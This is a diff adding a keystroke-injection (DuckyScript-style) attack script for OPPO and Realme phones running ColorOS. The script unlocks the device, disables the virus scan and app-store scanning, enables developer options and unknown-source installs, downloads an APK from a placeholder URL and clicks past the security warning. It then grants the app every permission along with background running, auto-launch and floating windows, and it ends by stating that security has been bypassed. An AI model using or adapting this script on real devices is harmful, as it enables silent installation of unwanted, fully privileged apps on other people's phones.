@@ -1,0 +1,330 @@
+REM OPPO/Realme ColorOS Security Bypass and App Installation
+REM Author: AryanVBW
+REM Version: 1.0
+REM Optimized for OPPO and Realme devices running ColorOS
+
+REM ---- INITIAL SETUP ----
+DELAY 1500
+
+REM Wake up the device
+ENTER
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Swipe up to unlock (ColorOS method)
+SWIPE 500 1800 500 800
+DELAY 1500
+
+REM ---- STEP 1: DISABLE COLOROS PHONE MANAGER SECURITY ----
+
+REM Open Settings
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Security (ColorOS path)
+STRING security
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Open Phone Manager
+STRING phone manager
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Disable Virus Scan
+STRING virus
+DELAY 800
+ENTER
+DELAY 1500
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Go back to Security
+BACK
+DELAY 800
+
+REM ---- STEP 2: DISABLE APP MARKET PROTECTION ----
+
+REM Open App Market (OPPO/Realme store)
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING app market
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Open App Market settings
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1500
+
+REM Disable security scanning
+STRING scan
+DELAY 800
+ENTER
+DELAY 1500
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- STEP 3: ENABLE DEVELOPER OPTIONS (COLOROS PATH) ----
+
+REM Go to Settings
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to About phone in ColorOS
+STRING about
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find Version number
+STRING version
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Tap on Version number 7 times
+REPEAT 7 {
+    ENTER
+    DELAY 300
+}
+DELAY 1500
+
+REM Go back to main Settings
+BACK
+DELAY 800
+
+REM ---- STEP 4: ENABLE INSTALLATION FROM UNKNOWN SOURCES (COLOROS PATH) ----
+
+REM Navigate to Additional Settings in ColorOS
+STRING additional
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find "App installation" or "Unknown sources"
+STRING app install
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Select Chrome browser
+STRING chrome
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Enable permission (ColorOS toggle)
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- STEP 5: DISABLE COLOROS APP STARTUP RESTRICTIONS ----
+
+REM Go back to main settings
+BACK
+DELAY 800
+BACK
+DELAY 800
+
+REM Navigate to Battery settings
+STRING battery
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find "Power saver options" or "App battery management"
+STRING power saver
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Disable power saving restrictions
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- STEP 6: DOWNLOAD AND INSTALL APK (COLOROS METHOD) ----
+
+REM Open Chrome browser
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING chrome
+DELAY 800
+ENTER
+DELAY 3000
+
+REM Access address bar (ColorOS Chrome)
+TAB
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Enter APK URL
+STRING https://example.com/app.apk
+DELAY 1000
+ENTER
+DELAY 5000
+
+REM Wait for download to start and complete
+DELAY 10000
+
+REM Open notification shade (ColorOS gesture)
+SWIPE 500 100 500 1700
+DELAY 1500
+
+REM Tap on download notification
+ENTER
+DELAY 3000
+
+REM Handle ColorOS security warning
+STRING install
+DELAY 800
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 3000
+
+REM ---- STEP 7: GRANT PERMISSIONS (COLOROS PERMISSION MODEL) ----
+
+REM Go to Settings for ColorOS permission management
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Apps in ColorOS
+STRING apps
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find the newly installed app
+STRING app
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Go to Permissions in ColorOS
+STRING permissions
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Grant all permissions (ColorOS permission UI)
+REPEAT 10 {
+    TAB
+    DELAY 300
+    ENTER
+    DELAY 1000
+    STRING allow
+    DELAY 500
+    ENTER
+    DELAY 800
+    BACK
+    DELAY 800
+}
+
+REM ---- STEP 8: ENABLE COLOROS BACKGROUND RUNNING ----
+
+REM Go back to app settings
+BACK
+DELAY 800
+
+REM Find "Background running" (ColorOS specific)
+STRING background
+DELAY 800
+ENTER
+DELAY 1500
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- STEP 9: ENABLE COLOROS AUTO-LAUNCH ----
+
+REM Go back to app settings
+BACK
+DELAY 800
+
+REM Find "Auto-launch" option (ColorOS specific)
+STRING auto-launch
+DELAY 800
+ENTER
+DELAY 1500
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- STEP 10: ENABLE COLOROS FLOATING WINDOWS ----
+
+REM Go back to app settings
+BACK
+DELAY 800
+
+REM Find "Floating windows" option (ColorOS specific)
+STRING floating
+DELAY 800
+ENTER
+DELAY 1500
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- STEP 11: LAUNCH THE APP ----
+
+REM Return to home screen
+HOME
+DELAY 800
+
+REM Open app drawer (ColorOS method)
+SWIPE 500 1700 500 700
+DELAY 1000
+
+REM Find and open the app
+STRING app
+DELAY 800
+ENTER
+DELAY 2000
+
+REM ---- FINISHED ----
+REM ColorOS security has been bypassed and app installed with full permissions
